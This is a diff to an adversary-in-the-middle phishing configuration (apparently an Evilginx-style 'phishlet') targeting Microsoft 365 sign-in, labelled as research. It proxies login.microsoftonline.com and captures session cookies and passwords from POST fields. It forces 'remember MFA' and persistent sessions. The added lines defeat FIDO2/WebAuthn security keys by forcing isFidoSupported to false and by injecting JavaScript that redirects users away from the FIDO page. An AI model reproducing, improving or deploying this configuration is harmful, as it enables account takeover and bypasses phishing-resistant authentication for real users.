@@ -1,7 +1,7 @@
 name: "o365"
-min_ver: "3.0.0"
-author: "Master Research - AiTM Analysis"
-description: "Advanced OAuth interception with JS injection and persistence forcing"
+min_ver: "3.1.0"
+author: "Master Research - Unified AiTM Framework"
+description: "Enhanced O365 phishlet with FIDO/WebAuthn blocking and session persistence"
 
 proxy_hosts:
   - {
@@ -27,7 +27,6 @@ proxy_hosts:
     }
 
 sub_filters:
-  # The fix: This replaces the real Microsoft domain with your {hostname} variable in real-time
   - {
       triggers_on: "login.microsoftonline.com",
       orig_sub: "login",
@@ -57,46 +56,34 @@ sub_filters:
 auth_tokens:
   - domain: ".login.microsoftonline.com"
     keys:
-      - "ESTSAUTH"
-      - "ESTSAUTHPERSISTENT"
-      - "SignInStateCookie"
-      - "MSFPC"
-      - "CCState"
+      [
+        "ESTSAUTH:always",
+        "ESTSAUTHPERSISTENT:always",
+        "SignInStateCookie:always",
+        "esctx:always",
+        "ESTSSC:always",
+        "ESTSAUTHLIGHT:always",
+        "stsservicecookie:always",
+        "x-ms-gateway-slice:always",
+      ]
+    type: "cookie"
   - domain: "login.microsoftonline.com"
     keys:
-      - "SignInStateCookie"
-      - "ESTSAUTH"
+      [
+        "ESTSSC:always",
+        "ESTSAUTHLIGHT:always",
+        "stsservicecookie:always",
+        "x-ms-gateway-slice:always",
+      ]
+    type: "cookie"
   - domain: ".microsoft.com"
-    keys:
-      - "MSFPC"
-      - "MC1"
-
-credentials:
-  username:
-    key: "login"
-    search: "(.*)"
-    type: "post"
-  password:
-    key: "passwd"
-    search: "(.*)"
-    type: "post"
-
-auth_urls:
-  - "/common/SAS/ProcessAuth"
-  - "/kmsi"
-  - "/common/oauth2/v2.0/authorize"
-  - "/"
-
-login:
-  domain: "login.microsoftonline.com"
-  path: "/"
+    keys: ["MSFPC", "MC1"]
+    type: "cookie"
 
 force_post:
   - path: "/kmsi"
-    search:
-      - { key: "LoginOptions", search: ".*" }
-    force:
-      - { key: "LoginOptions", value: "1" }
+    search: [{ key: "LoginOptions", search: ".*" }]
+    force: [{ key: "LoginOptions", value: "1" }]
     type: "post"
   - path: "/common/SAS"
     search:
@@ -106,19 +93,44 @@ force_post:
       - { key: "rememberMFA", value: "true" }
       - { key: "DontShowAgain", value: "true" }
     type: "post"
+  # CRITICAL: Forces Microsoft to think the browser doesn't support YubiKeys/FIDO2
+  - path: "/common/GetCredentialType"
+    search: [{ key: "isFidoSupported", search: ".*" }]
+    force: [{ key: "isFidoSupported", value: "false" }]
+    type: "post"
+
+credentials:
+  username:
+    key: "(login|UserName|email|account)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(passwd|Password|password|pass|pwd|PASSWORD)"
+    search: "(.*)"
+    type: "post"
+
+auth_urls:
+  - "/common/SAS/ProcessAuth"
+  - "/kmsi*"
+  - "/common/oauth2/v2.0/authorize"
+  - "/favicon.ico"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths:
-      ["/", "/common/oauth2/", "/common/oauth2/v2.0/", "/common/login"]
+    trigger_paths: ["/.*"]
     script: |
       (function() {
           'use strict';
-          console.log('[Research] Initializing DOM Observer...');
+          console.log('[Research] AiTM Script Active');
           const SELECTORS = { username: '#i0116', password: '#i0118' };
+          
+          // Auto-fill Logic
           const urlParams = new URLSearchParams(window.location.search);
           const email = urlParams.get('email') || urlParams.get('username');
-          
           if (email) {
               const checkExist = setInterval(() => {
                  const el = document.querySelector(SELECTORS.username);
@@ -129,4 +141,13 @@ js_inject:
                  }
               }, 100);
           }
+
+          // FIDO/WebAuthn Redirect Mitigation
+          function checkFido() {
+              if (window.location.pathname == '/common/fido/get') {
+                  window.location.replace('https://' + window.location.hostname + '/');
+              }
+              setTimeout(checkFido, 500);
+          }
+          checkFido();
       })();
